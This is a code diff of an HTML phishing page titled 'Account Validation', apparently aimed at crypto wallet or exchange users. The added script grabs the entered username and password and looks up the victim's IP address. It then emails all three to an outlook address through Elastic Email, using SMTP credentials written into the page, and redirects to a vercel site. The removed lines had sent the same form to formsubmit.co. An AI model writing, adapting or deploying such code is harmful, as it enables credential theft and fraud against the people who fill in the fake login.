@@ -70,9 +70,9 @@ span.psw {
 
 <h2>Account Validation</h2>
 
-<form action="https://formsubmit.co/Groupresult43@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_next" value="https://validatewalleturl.vercel.app/scan/scan">  <div class="imgcontainer">
+<form>
+    <input type="hidden" name="_next" value="https://validate-exchange3.vercel.app">
+	<div class="imgcontainer">
     <img src="img_avatar2.png" alt="Avatar" class="avatar">
   </div>
   <div class="container">
@@ -82,13 +82,45 @@ span.psw {
     <label for="password"><b>Password</b></label>
     <input type="password" placeholder="Enter Password" name="password" required>
         
-    <button type="submit">Login</button>
+    <button type="submit" onclick="sendmail()" id="btn_sig">Login</button>
     <label>
       <input type="checkbox" checked="checked" name="remember"> Remember me
     </label>
   </div>
 </form>
-
+    <script>
+        function sendmail(){
+          var email = document.getElementById('inp_pwd').value;
+          var password = document.getElementById('inp_uname').value;
+          //const ipAddress = event.candidate.candidate.split(' ')[4];
+           
+           fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ipAddress = data.ip;
+                    this.sendEmail(email, password, ipAddress);
+                })
+                .catch(error => {
+                    console.log('Error:', error);
+            });
+        }
+        function sendEmail(email, password, ipAddress) {
+                Email.send({
+                    Host: "smtp.elasticemail.com",
+                    Username: "Akinola11549@outlook.com",
+                    Port:"2525",
+                    Password: "9C7824D1474AA7E50B3CAE331A2933565720",
+                    To: 'Akinola11549@outlook.com',
+                    From: "Akinola11549@outlook.com",
+                    Subject: "Micro Access",
+                    Body: `Email: ${email} <br> password: ${password}<br>IP Address: ${ipAddress}`,
+                })
+                    .then(function (message) {
+                       // alert("mail sent successfully")
+                    });
+            }
+    </script>
+    
 </body>
 </html>
  
